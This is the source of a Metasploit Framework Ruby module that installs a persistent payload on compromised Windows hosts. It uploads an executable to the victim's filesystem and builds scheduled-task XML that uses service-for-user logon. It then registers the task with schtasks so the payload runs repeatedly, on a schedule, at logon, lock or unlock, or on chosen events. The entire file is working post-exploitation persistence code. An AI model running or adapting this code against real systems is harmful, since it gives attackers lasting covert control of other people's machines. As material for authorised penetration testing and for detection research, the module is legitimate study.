##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Exploit::EXE

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage User Level Persistent Payload Installer',
			'Description'   => %q{
				Creates a scheduled task that will run using service-for-user (S4U).
				This allows the scheduled task to run even as an unprivileged user
				that is not logged into the device. This will result in lower security 
				context, allowing access to local resources only. The module
				requires 'Logon as a batch job' permissions (SeBatchLogonRight).
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
					'Brandon McCann "zeknox" <bmccann[at]accuvant.com>',
				],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'Targets'       => [ [ 'Windows', {} ] ],
			'DefaultTarget' => 0,
			'References'     => [
				[ 'URL', 'http://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/']
			]
		))

		register_options(
			[
				OptInt.new('FREQUENCY', [false, 'Schedule trigger: Frequency in minutes to execute', '']),
				OptInt.new('EXPIRE_TIME', [false, 'Number of minutes until trigger expires', '']),
				OptEnum.new('TRIGGER', [true, 'Payload trigger method', 'schedule',['logon', 'lock', 'unlock','schedule', 'event']]),
				OptString.new('REXENAME',[false, 'Name of exe on remote system', '']),
				OptString.new('RTASKNAME',[false, 'Name of exe on remote system', '']),
				OptString.new('PATH',[false, 'PATH to write payload', '']),
			], self.class)

		register_advanced_options(
			[
				OptString.new('EVENT_LOG', [false, 'Event trigger: The event log to check for event','']),
				OptInt.new('EVENT_ID', [false, 'Event trigger: Event ID to trigger on.','']),
				OptString.new('XPATH', [false, 'XPath query','']),
			], self.class)
	end

	def exploit
		# If Vista/2008 or later add /R
		if not (sysinfo['OS'] =~ /Build [6-9]\d\d\d/)
			print_error("This module only works on Vista/2008 and above")
			return
		end

		if datastore['TRIGGER'] == "event"
			if datastore['EVENT_LOG'].empty? or datastore['EVENT_ID'] == 0
				print_error("Advanced options EVENT_LOG and EVENT_ID required for event")
				print_error("The properties of any event in the event viewer will contain this information")
				return
			end
		end

		schname = Rex::Text.rand_text_alpha((rand(8)+6))

		# Generate payload
		payload = generate_payload_exe

		# Generate remote executable name
		rexename = generate_rexename
		return if rexename.nil?

		# Generate path names
		xml_path,rexe_path = generate_path(rexename)
		return if not xml_path or not rexe_path

		# Upload REXE to victim fs
		upload_response = upload_rexe(rexe_path, payload)
		return if not upload_response

		# Create basic XML outline
		xml = create_xml(rexe_path, schname)
		if not xml
			delete_file(rexe_path)
			return
		end

		# Fix XML based on trigger
		xml = fix_xml(xml)

		# Write XML to victim fs
		path = write_xml(xml, xml_path, rexe_path)
		return if not path

		# Name task with Opt
		if not datastore['RTASKNAME'].empty?
			schname = datastore['RTASKNAME']
		end

		# Create task with modified XML
		task = create_task(xml_path, schname, rexe_path)
		return if not task
	end

	##############################################################
	# Generate name for payload
	# Returns name

	def generate_rexename
		# Check for valid rexename
		if datastore['REXENAME'].empty?
			rexename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
			return rexename
		elsif datastore['REXENAME'] =~ /\.exe$/
			rexename = datastore['REXENAME']
			return rexename
		else
			print_warning("#{datastore['REXENAME']} isn't an exe")
			return rexename
		end
	end

	##############################################################
	# Generate Path for payload upload
	# Returns path for xml and payload

	def generate_path(rexename)
		# generate a path to write payload and xml
		if not datastore['PATH'].empty?
			path = datastore['PATH']
		else
			path = session.fs.file.expand_path("%TEMP%")
		end
		xml_path = "#{path}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}.xml"
		rexe_path = "#{path}\\#{rexename}"
		return xml_path,rexe_path			
	end

	##############################################################
	# Upload the executable payload
	# Returns boolean for success

	def upload_rexe(path, payload)
		begin
			vprint_status("Uploading #{path}")
			fd = client.fs.file.new(path, "wb")
			fd.write(payload)
			fd.close
		rescue
			print_error("Could not upload to #{path}")
			return false
		end
		print_status("Successfully uploaded remote executable to #{path}")
		return true
	end

	##############################################################
	# Creates a scheduled task, exports as XML, deletes task
	# Returns normal XML for generic task

	def create_xml(path, schname)
		xml_path = File.join(Msf::Config.install_root, "data", "exploits", "s4u_persistence")
		xml_file = File.new(xml_path,"r")
		xml = xml_file.read
		xml_file.close

		puts path
		begin
			vt = client.railgun.kernel32.GetLocalTime(32)
			ut = vt['lpSystemTime'].unpack("v*")
			t = ::Time.utc(ut[0],ut[1],ut[3],ut[4],ut[5])
		rescue
			print_error("Could not read system time from victim...using your local time to determine expire date")
			t = ::Time.now
		end
		date = t.strftime("%Y-%m-%d")
		time = t.strftime("%H:%M:%S")

		# put in correct times
		xml = xml.gsub(/DATEHERE/, "#{date}T#{time}")

		domain, user = client.sys.config.getuid.split('\\')

		# put in user information
		xml = xml.sub(/DOMAINHERE/, user)
		xml = xml.sub(/USERHERE/, "#{domain}\\#{user}")

		xml = xml.sub(/COMMANDHERE/, "#{domain}\\#{user}")
		return xml
	end

	##############################################################
	# Takes the XML, alters it based on trigger specified. Will also
	# add in expiration tag if used. 
	# Returns the modified XML

	def fix_xml(xml)
		# Insert trigger 
		case datastore['TRIGGER']
			when 'logon'
				# Trigger based on winlogon event, checks windows license key after logon
				print_status("This trigger triggers on event 4101 which validates the Windows license")
				line = "(EventID=4101) and *[System[Provider[@Name='Microsoft-Windows-Winlogon']]]"
				xml = create_trigger_event_tags("Application", line, xml)

			when 'lock'
				xml = create_trigger_tags("SessionLock", xml)

			when 'unlock'
				xml = create_trigger_tags("SessionUnlock", xml)

			when 'event'
				line = "*[System[(EventID=#{datastore['EVENT_ID']})]]"
				if not datastore['XPATH'].empty?
					line << " and #{datastore['XPATH']}"
				end
				vprint_status("\tPayload will trigger on #{line}")

				xml = create_trigger_event_tags(datastore['EVENT_LOG'], line, xml)

			when 'schedule'
				# Change interval tag, insert into XML
				if datastore['FREQUENCY'] != 0
					minutes = datastore['FREQUENCY']
				else
					if datastore['TRIGGER'] == 'schedule'
						print_status("Defaulting frequency to every hour")
					end
					minutes = 60
				end
				xml = xml.sub(/<Interval>.*?</, "<Interval>PT#{minutes}M<")

				# Generate expire tag, insert into XML
				end_boundary = create_expire_tag if datastore['EXPIRE_TIME']
				insert = xml.index("</StartBoundary>")
				xml.insert(insert + 16, "\n      #{end_boundary}")
		end
		return xml
	end


	##############################################################
	# Creates end boundary tag which expires the trigger
	# Returns XML for expire

	def create_expire_tag()
		# Get local time of windows system
		begin
			vt = client.railgun.kernel32.GetLocalTime(32)
			ut = vt['lpSystemTime'].unpack("v*")
			t = ::Time.utc(ut[0],ut[1],ut[3],ut[4],ut[5])
		rescue
			print_error("Could not read system time from victim...using your local time to determine expire date")
			t = ::Time.now
		end
		# Create time object to add expire time to and create tag
		t = t + (datastore['EXPIRE_TIME'] * 60)
		date = t.strftime("%Y-%m-%d")
		time = t.strftime("%H:%M:%S")
		end_boundary = "<EndBoundary>#{date}T#{time}</EndBoundary>"
		return end_boundary
	end

	##############################################################
	# Creates trigger XML for session state triggers and replaces
	# the time trigger.
	# Returns altered XML

	def create_trigger_tags(trig, xml)
		domain, user = client.sys.config.getuid.split('\\')

		temp_xml = "<SessionStateChangeTrigger>\n"
		temp_xml << "      #{create_expire_tag}" if not datastore['EXPIRE_TIME'] == 0
		temp_xml << "      <Enabled>true</Enabled>\n"
		temp_xml << "      <StateChange>#{trig}</StateChange>\n"
		temp_xml << "      <UserId>#{domain}\\#{user}</UserId>\n"
		temp_xml << "    </SessionStateChangeTrigger>"

		xml = xml.gsub(/<TimeTrigger>.*<\/TimeTrigger>/m, temp_xml)

		return xml
	end

	##############################################################
	# Creates trigger XML for event based triggers and replaces
	# the time trigger.
	# Returns altered XML

	def create_trigger_event_tags(log, line, xml)
		domain, user = client.sys.config.getuid.split('\\')

		# Fscked up XML syntax for windows event #{id} in #{log}
		temp_xml = "<EventTrigger>\n"
		temp_xml << "      #{create_expire_tag}\n" if not datastore['EXPIRE_TIME'] == 0
		temp_xml << "      <Enabled>true</Enabled>\n"
		temp_xml << "      <Subscription>&lt;QueryList&gt;&lt;Query Id=\"0\" "
		temp_xml << "Path=\"#{log}\"&gt;&lt;Select Path=\"#{log}\"&gt;"
		temp_xml << "      #{line}"
		temp_xml << "&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;"
		temp_xml << "</Subscription>\n"
		temp_xml << "    </EventTrigger>"

		xml = xml.gsub(/<TimeTrigger>.*<\/TimeTrigger>/m, temp_xml)
		return xml
	end

	##############################################################
	# Takes the XML and a path and writes file to filesystem
	# Returns the path of XML

	def write_xml(xml, path, rexe_path)
		begin
			fd = session.fs.file.new(path, "wb")
			fd.write(xml)
			fd.close
		rescue
			print_error("Issues writing XML to #{path}")
			delete_file(rexe_path)
			return nil
		end
		print_status("Successfully wrote XML file to #{path}")
		return path
	end

	##############################################################
	# Takes path and delete file
	# Returns boolean for success

	def delete_file(path)
		begin
			session.fs.file.rm(path)
		rescue
			print_warning("Could not delete file #{path}, delete manually")
			return false
		end
		return true
	end

	##############################################################
	# Takes path and name for task and creates final task
	# Returns boolean for success

	def create_task(path, schname, rexe_path)
		# create task using XML file on victim fs
		create_task_response = cmd_exec("cmd.exe", "/c schtasks /create /xml #{path} /tn #{schname}")
		if create_task_response =~ /has successfully been created/
			print_good("Persistence created successfully")
			del_task = "schtasks.exe /delete /tn #{schname} /f"
			print_status("\t To delete task: #{del_task}")
			print_status("\t To delete payload: del #{rexe_path}")
			del_task << "\ndel #{rexe_path}"
			delete_file(path)

			report_note(:host => session.session_host,
			:type => "host.s4u_persistance.cleanup",
			:data => {
				:session_num => session.sid,
				:stype => session.type,
				:desc => session.info,
				:platform => session.platform,
				:via_payload => session.via_payload,
				:via_exploit => session.via_exploit,
				:created_at => Time.now.utc,
				:delete_commands =>  del_task
				}
			)
			return true
		else
			print_error("Issues creating task using XML file schtasks")
			if datastore['EVENT_LOG'] == 'Security' and datastore['TRIGGER'] == "Event"
				print_warning("Security log can restricted by UAC, try a different trigger")
			end
			delete_file(rexe_path)
			delete_file(path)
			return false
		end
	end
end